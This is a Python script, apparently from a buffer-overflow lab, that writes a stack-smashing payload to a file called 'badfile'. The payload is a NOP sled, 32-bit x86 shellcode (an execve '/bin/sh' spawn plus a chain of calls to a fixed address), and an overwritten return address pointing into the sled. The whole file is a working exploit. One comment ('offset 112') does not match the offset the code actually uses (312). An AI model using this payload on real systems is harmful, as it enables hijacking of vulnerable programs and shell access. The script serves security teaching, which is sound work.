#!/usr/bin/python3
import sys 
 
shellcode= ( 

"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

function = (
    "\x31\xC0\x31\xC9\xBB\x86\x62\x55\x56\x40\x40\x41\x51\x50\xFF\xD3\x31\xC9\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3\x31\xC9\x41\x41\x41\x41\x41\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3\x31\xC9\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3\x31\xC9\x41\x41\x41\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3\x31\xC9\x41\x41\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3"
).encode('latin-1')

inject_fn = function
 
total_ln = 1684

# ebp+4-buffer
dist = 312
NOPs = 0x100
ebp_8 = 0xffffcd60
 
L = 4
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(total_ln)) 
print(len(shellcode))
print(len(function))
print(len(inject_fn))


# Put the shellcode at the end 
shell_end = total_ln
start = shell_end - len(inject_fn) 
content[start:start+len(inject_fn)] = inject_fn 


# Put the address at offset 112 
jmp_addr = ebp_8 + NOPs
content[dist:dist+L] = (jmp_addr).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

